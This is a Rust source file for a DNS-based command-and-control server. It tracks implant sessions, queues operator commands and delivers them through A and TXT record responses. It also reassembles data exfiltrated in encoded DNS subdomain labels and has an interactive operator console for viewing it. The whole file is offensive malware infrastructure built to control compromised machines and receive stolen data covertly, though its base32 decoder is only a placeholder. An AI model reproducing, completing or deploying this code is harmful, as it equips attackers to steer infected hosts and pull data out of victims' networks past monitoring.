use std::collections::HashMap;
use std::io::{self, Write};
use std::sync::{Arc, Mutex};

// DNS Header structure (12 bytes)
// See RFC 1035 Section 4.1.1
pub struct DnsHeader {
    id: u16,       // Transaction ID
    flags: u16,    // Flags field
    qd_count: u16, // Number of questions
    an_count: u16, // Number of answers
    ns_count: u16, // Number of authority records
    ar_count: u16, // Number of additional records
}

impl DnsHeader {
    pub fn from_bytes(buf: &[u8]) -> Result<Self, &'static str> {
        if buf.len() < 12 {
            return Err("Buffer too small for DNS header");
        }

        Ok(DnsHeader {
            id: u16::from_be_bytes([buf[0], buf[1]]),
            flags: u16::from_be_bytes([buf[2], buf[3]]),
            qd_count: u16::from_be_bytes([buf[4], buf[5]]),
            an_count: u16::from_be_bytes([buf[6], buf[7]]),
            ns_count: u16::from_be_bytes([buf[8], buf[9]]),
            ar_count: u16::from_be_bytes([buf[10], buf[11]]),
        })
    }

    pub fn to_bytes(&self) -> [u8; 12] {
        let mut bytes = [0u8; 12];
        bytes[0..2].copy_from_slice(&self.id.to_be_bytes());
        bytes[2..4].copy_from_slice(&self.flags.to_be_bytes());
        bytes[4..6].copy_from_slice(&self.qd_count.to_be_bytes());
        bytes[6..8].copy_from_slice(&self.an_count.to_be_bytes());
        bytes[8..10].copy_from_slice(&self.ns_count.to_be_bytes());
        bytes[10..12].copy_from_slice(&self.ar_count.to_be_bytes());
        bytes
    }
}

// DNS Question Type
#[derive(Debug, Clone, Copy, PartialEq)]
#[repr(u8)]
pub enum QType {
    A = 1,
    TXT = 16,
    Unknown(u16),
}

impl From<u16> for QType {
    fn from(val: u16) -> Self {
        match val {
            1 => QType::A,
            16 => QType::TXT,
            _ => QType::Unknown(val),
        }
    }

    // fn to_u16(&self) -> u16 {
    //     match self {
    //         QType::A => 1,
    //         QType::TXT => 16,
    //         QType::Unknown(v) => *v,
    //     }
    // }
}

// Parsed DNS Question
pub struct DnsQuestion {
    pub name: String,
    pub qtype: QType,
    pub qclass: u16,
    pub name_length: usize,
}

// C2 Session Management
pub struct ImplantSession {
    id: String,
    command_queue: Vec<String>,
    data_chunks: HashMap<u32, String>,
    last_seen: std::time::SystemTime,
}

pub struct C2State {
    sessions: HashMap<String, ImplantSession>,
}

impl C2State {
    pub fn new() -> Self {
        C2State {
            sessions: HashMap::new(),
        }
    }

    pub fn get_or_create_session(&mut self, implant_id: &str) -> &mut ImplantSession {
        self.sessions
            .entry(implant_id.to_string())
            .or_insert(ImplantSession {
                id: implant_id.to_string(),
                command_queue: Vec::new(),
                data_chunks: HashMap::new(),
                last_seen: std::time::SystemTime::now(),
            })
    }

    pub fn add_command(&mut self, implant_id: &str, command: &String) {
        let session = self.get_or_create_session(implant_id);
        session.command_queue.push(command.to_string());
        println!("[C2] Added command for {}: {}", implant_id, command);
    }

    pub fn get_next_command(&mut self, implant_id: &str) -> Option<String> {
        if let Some(session) = self.sessions.get_mut(implant_id) {
            session.last_seen = std::time::SystemTime::now();
            if !session.command_queue.is_empty() {
                return Some(session.command_queue.remove(0));
            }
        }
        None
    }

    pub fn has_commands(&self, implant_id: &str) -> bool {
        self.sessions
            .get(implant_id)
            .map(|s| !s.command_queue.is_empty())
            .unwrap_or(false)
    }

    pub fn store_chunk(&mut self, implant_id: &str, seq: u32, data: String) {
        let session = self.get_or_create_session(implant_id);
        session.data_chunks.insert(seq, data);
        session.last_seen = std::time::SystemTime::now();
        println!(
            "[C2] Stored chunk {} for {} (total chunks: {})",
            seq,
            implant_id,
            session.data_chunks.len()
        );
    }

    pub fn list_sessions(&self) {
        if self.sessions.is_empty() {
            println!("No active sessions");
            return;
        }

        println!("\nActive Sessions:");
        println!("{:-<70}", "");
        for (id, session) in &self.sessions {
            let elapsed = session
                .last_seen
                .elapsed()
                .map(|d| format!("{}s ago", d.as_secs()))
                .unwrap_or_else(|_| "unknown".to_string());
            println!(
                "  {} | Commands queued: {} | Last seen: {}",
                id,
                session.command_queue.len(),
                elapsed
            );
        }
        println!("{:-<70}", "");
    }

    pub fn get_exfil_data(&self, implant_id: &str) -> Option<String> {
        self.sessions.get(implant_id).map(|session| {
            let mut chunks: Vec<_> = session.data_chunks.iter().collect();
            chunks.sort_by_key(|(seq, _)| *seq);
            chunks
                .iter()
                .map(|(_, data)| data.as_str())
                .collect::<Vec<_>>()
                .join("")
        })
    }
}

// Parse DNS domain name from query (RFC 1035 Section 4.1.2)
pub fn parse_domain_name(buf: &[u8], mut offset: usize) -> Result<(String, usize), &'static str> {
    let mut domain = String::new();
    let start_offset = offset;

    loop {
        if offset >= buf.len() {
            return Err("Unexpected end of buffer");
        }

        let len = buf[offset] as usize;
        offset += 1;

        if len == 0 {
            break;
        }

        if len & 0xC0 == 0xC0 {
            return Err("DNS compression not yet supported");
        }

        if offset + len > buf.len() {
            return Err("Domain name exceeds buffer");
        }

        if !domain.is_empty() {
            domain.push('.');
        }

        domain.push_str(&String::from_utf8_lossy(&buf[offset..offset + len]));
        offset += len;
    }

    Ok((domain, offset - start_offset))
}

// Parse DNS question section
pub fn parse_question(buf: &[u8], offset: usize) -> Result<DnsQuestion, &'static str> {
    let (name, name_length) = parse_domain_name(buf, offset)?;
    let type_offset = offset + name_length;

    if type_offset + 4 > buf.len() {
        return Err("Buffer too small for question type/class");
    }

    let qtype = u16::from_be_bytes([buf[type_offset], buf[type_offset + 1]]).into();
    let qclass = u16::from_be_bytes([buf[type_offset + 2], buf[type_offset + 3]]);

    Ok(DnsQuestion {
        name,
        qtype,
        qclass,
        name_length: name_length + 4,
    })
}

// Build DNS A record response
pub fn build_a_record_response(query: &[u8], query_len: usize, has_commands: bool) -> Vec<u8> {
    let mut response = Vec::new();
    let header = DnsHeader::from_bytes(query).unwrap();

    let response_header = DnsHeader {
        id: header.id,
        flags: 0x8180,
        qd_count: 1,
        an_count: 1,
        ns_count: 0,
        ar_count: 0,
    };

    response.extend_from_slice(&response_header.to_bytes());
    response.extend_from_slice(&query[12..query_len]);

    // Answer section
    response.push(0xC0);
    response.push(0x0C);
    response.extend_from_slice(&1u16.to_be_bytes()); // Type A
    response.extend_from_slice(&1u16.to_be_bytes()); // Class IN
    response.extend_from_slice(&60u32.to_be_bytes()); // TTL
    response.extend_from_slice(&4u16.to_be_bytes()); // Data length

    if has_commands {
        response.extend_from_slice(&[1, 2, 3, 5]);
    } else {
        response.extend_from_slice(&[1, 2, 3, 4]);
    }

    response
}

// Build DNS TXT record response
pub fn build_txt_record_response(query: &[u8], query_len: usize, txt_data: &str) -> Vec<u8> {
    let mut response = Vec::new();
    let header = DnsHeader::from_bytes(query).unwrap();

    let response_header = DnsHeader {
        id: header.id,
        flags: 0x8180,
        qd_count: 1,
        an_count: 1,
        ns_count: 0,
        ar_count: 0,
    };

    response.extend_from_slice(&response_header.to_bytes());
    response.extend_from_slice(&query[12..query_len]);

    // Answer section
    response.push(0xC0);
    response.push(0x0C);
    response.extend_from_slice(&16u16.to_be_bytes());   // Type TXT
    response.extend_from_slice(&1u16.to_be_bytes());    // Class IN
    response.extend_from_slice(&60u32.to_be_bytes());   // TTL

    let txt_bytes = txt_data.as_bytes();
    let data_len = (txt_bytes.len() + 1) as u16;
    response.extend_from_slice(&data_len.to_be_bytes());
    response.push(txt_bytes.len() as u8);
    response.extend_from_slice(txt_bytes);

    response
}

// Decode base32 data (placeholder)
pub fn decode_base32(encoded: &str) -> Result<String, &'static str> {
    Ok(encoded.to_uppercase())
}

// Parse C2 protocol from domain name
pub fn parse_c2_request(domain: &str) -> Option<C2Request> {
    let parts: Vec<&str> = domain.split('.').collect();

    if parts.len() < 2 {
        return None;
    }

    if parts.len() >= 3 && parts[1] == "beacon" {
        return Some(C2Request::Beacon {
            implant_id: parts[0].to_string(),
        });
    }

    if parts.len() >= 3 && parts[0] == "cmd" {
        return Some(C2Request::FetchCommand {
            implant_id: parts[1].to_string(),
        });
    }

    if parts.len() >= 5 && parts[3] == "exfil" {
        if let Ok(seq) = parts[1].parse::<u32>() {
            let data = decode_base32(parts[0]).ok()?;
            return Some(C2Request::Exfiltrate {
                implant_id: parts[2].to_string(),
                sequence: seq,
                data,
            });
        }
    }

    None
}

pub enum C2Request {
    Beacon {
        implant_id: String,
    },
    FetchCommand {
        implant_id: String,
    },
    Exfiltrate {
        implant_id: String,
        sequence: u32,
        data: String,
    },
}

pub fn base64_encode(data: &str) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let bytes = data.as_bytes();
    let mut result = String::new();

    for chunk in bytes.chunks(3) {
        let b1 = chunk[0];
        let b2 = chunk.get(1).copied().unwrap_or(0);
        let b3 = chunk.get(2).copied().unwrap_or(0);

        result.push(CHARS[(b1 >> 2) as usize] as char);
        result.push(CHARS[(((b1 & 0x03) << 4) | (b2 >> 4)) as usize] as char);

        if chunk.len() > 1 {
            result.push(CHARS[(((b2 & 0x0F) << 2) | (b3 >> 6)) as usize] as char);
        } else {
            result.push('=');
        }

        if chunk.len() > 2 {
            result.push(CHARS[(b3 & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }

    result
}

pub fn print_banner() {
    println!("\n{:=<70}", "");
    println!("            DNS C2 Server - Command & Control");
    println!("{:=<70}", "");
    println!("Server listening on 0.0.0.0:5353");
    println!("(Use port 53 for production - requires sudo/admin)\n");
}

pub fn print_help() {
    println!("\nCommands:");
    println!("  cmd <implant_id> <command>  - Queue command for implant");
    println!("  sessions                    - List active implant sessions");
    println!("  exfil <implant_id>          - Show exfiltrated data");
    println!("  help                        - Show this help");
    println!("  exit                        - Shutdown server\n");
}

pub fn cli_loop(c2_state: Arc<Mutex<C2State>>) {
    print_help();

    loop {
        print!("c2> ");
        io::stdout().flush().unwrap();

        let mut input = String::new();
        if io::stdin().read_line(&mut input).is_err() {
            continue;
        }

        let input = input.trim();
        let parts: Vec<&str> = input.split_whitespace().collect();

        if parts.is_empty() {
            continue;
        }

        match parts[0] {
            "cmd" => {
                if parts.len() < 3 {
                    println!("Usage: cmd <implant_id> <command>");
                    continue;
                }
                let implant_id = parts[1];
                let command = parts[2..].join(" ");

                let mut state = c2_state.lock().unwrap();
                state.add_command(implant_id, &command);
            }
            "sessions" => {
                let state = c2_state.lock().unwrap();
                state.list_sessions();
            }
            "exfil" => {
                if parts.len() < 2 {
                    println!("Usage: exfil <implant_id>");
                    continue;
                }
                let implant_id = parts[1];
                let state = c2_state.lock().unwrap();

                if let Some(data) = state.get_exfil_data(implant_id) {
                    println!("\n[Exfiltrated Data from {}]", implant_id);
                    println!("{:-<70}", "");
                    println!("{}", data);
                    println!("{:-<70}", "");
                } else {
                    println!("No data found for implant: {}", implant_id);
                }
            }
            "help" => {
                print_help();
            }
            "exit" => {
                println!("Shutting down...");
                std::process::exit(0);
            }
            _ => {
                println!("Unknown command: {}. Type 'help' for commands.", parts[0]);
            }
        }
    }
}
